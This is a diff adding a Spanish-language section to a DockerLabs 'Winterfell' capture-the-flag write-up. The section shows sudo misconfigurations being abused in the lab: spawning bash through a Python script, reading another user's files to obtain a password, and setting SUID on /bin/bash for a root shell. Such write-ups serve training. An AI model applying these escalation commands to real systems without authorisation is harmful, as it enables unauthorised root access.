@@ -104,6 +104,57 @@ import os
 os.system("/bin/bash")
 ```
 
+Hecho esto si le damos al comando:  
+
+`sudo -u aria /usr/bin/python3 /home/jon/.mensaje.py`  
+
+ya podemos convertirnos en el usuario **aria**.  
+
+![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_15.jpg)      
+
+Miramos con `sudo -l` si podemos aprovechar de algun binario para escarlnos a root.  
+
+![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_16.jpg)        
+
+Miramos a ver si en la home del usuario daenerys hay algo que nos puede servir.  
+Para ello damos el comando:  
+
+`sudo -u daenerys /usr/bin/ls /home/daenerys/`  
+
+![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_17.jpg)      
+
+Bien, ahora lo leemos con el comando:  
+
+`sudo -u daenerys /usr/bin/cat /home/daenerys/mensajeParaJon`  
+
+![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_18.jpg)     
+
+Perfecto!  
+Ahora tenemos la contraseña del usuario daenerys.  
+Entramos y le damos otra vez al comando `sudo -l`  
+
+![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_19.jpg)    
+
+Vemos que no tenemos permisos para editar el fichero con nano y tampoco podemos eliminarlo. 
+Lo que intentaremos hacer es crear uno script oneliner e inviarselo con echo.  
+Digitaremos el siguente comando:  
+
+`echo -e '#!/bin/bash \n chmod u+s /bin/bash' > .shell.sh`  
+
+Si abrimos el fichero vemos que se ha enviado todo correctamente.  
+
+![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_20.jpg)    
+
+Ahora ejecutaremos el comando:  
+
+`sudo /usr/bin/bash /home/daenerys/.secret/.shell.sh`  
+
+Y si le damos a `bash -p`...listo!
+Ya somos root!  
+
+![W](https://github.com/giustiand/DockerLabs-Writeups/blob/main/F%C3%A1cil/images/winterfell/W_21.jpg)    
+
+
 
 
 
